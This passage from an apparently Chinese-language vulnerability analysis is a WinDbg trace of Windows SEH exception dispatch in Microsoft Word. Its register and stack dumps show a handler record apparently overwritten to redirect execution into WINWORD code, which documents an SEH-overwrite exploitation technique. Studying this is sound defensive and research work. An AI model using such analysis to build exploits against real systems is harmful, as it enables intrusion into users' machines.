class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x9</span>:</span><br><span class="line">7c92325f 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923261 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xb</span>:</span><br><span class="line">7c923261 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123440</span>=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923265 <span class="built_in">esp</span>=0012341c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xf</span>:</span><br><span class="line">7c923265 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:0012343c=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923269 <span class="built_in">esp</span>=<span class="number">00123418</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x13</span>:</span><br><span class="line">7c923269 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123438</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92326d <span class="built_in">esp</span>=<span class="number">00123414</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x17</span>:</span><br><span class="line">7c92326d ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123434</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923271 <span class="built_in">esp</span>=<span class="number">00123410</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1b</span>:</span><br><span class="line">7c923271 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123430</span>=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">4</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923275 <span class="built_in">esp</span>=0012340c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1f</span>:</span><br><span class="line">7c923275 e808000000      <span class="keyword">call</span>    ntdll!ExecuteHandler2 (7c923282)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012340c  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">0012341c  30001bdd <span class="number">00130000</span> 001234cc 0012ffb0</span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923282 <span class="built_in">esp</span>=<span class="number">00123408</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2:</span><br><span class="line">7c923282 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923283 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1</span>:</span><br><span class="line">7c923283 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923285 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x3</span>:</span><br><span class="line">7c923285 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923288 <span class="built_in">esp</span>=<span class="number">00123400</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x6</span>:</span><br><span class="line">7c923288 <span class="number">52</span>              <span class="keyword">push</span>    <span class="built_in">edx</span> &lt;---- ERR-&gt;Handler</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923289 <span class="built_in">esp</span>=001233fc <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x7</span>:</span><br><span class="line">7c923289 64ff3500000000  <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]     <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- ERR-&gt;Next</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923290 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0xe</span>:</span><br><span class="line">7c923290 <span class="number">64892500000000</span>  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span> <span class="built_in">fs</span>:003b:<span class="number">00000000</span>=0012ffb0 &lt;---- 当前SEH链表头部</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923297 <span class="built_in">esp</span>=001233f8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x15</span>:</span><br><span class="line">7c923297 ff7514          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123418</span>=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123468</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 001233f8</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0x0012ffb0</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x7c9232bc</span>     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329a <span class="built_in">esp</span>=001233f4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x18</span>:</span><br><span class="line">7c92329a ff7510          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123414</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92329d <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1b</span>:</span><br><span class="line">7c92329d ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123410</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a0 <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1e</span>:</span><br><span class="line">7c9232a0 ff7508          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:0012340c=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a3 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x21</span>:</span><br><span class="line">7c9232a3 8b4d18          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0012341c=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">5</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c9232a6 <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x24</span>:</span><br><span class="line">7c9232a6 ffd1            <span class="keyword">call</span>    <span class="built_in">ecx</span> &#123;WINWORD+<span class="number">0x1bdd</span> (30001bdd)&#125;</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e8  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">001233f8  0012ffb0 7c9232bc 0012ffb0 001234b4</span><br><span class="line"><span class="number">00123408</span>  7c92327a 001234cc 0012ffb0 001234e8</span><br><span class="line"><span class="number">00123418</span>  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line"><span class="number">00123428</span>  0012ffb0 7c94a9ef 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123438</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123448</span>  001234cc 1104c830 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123458</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span 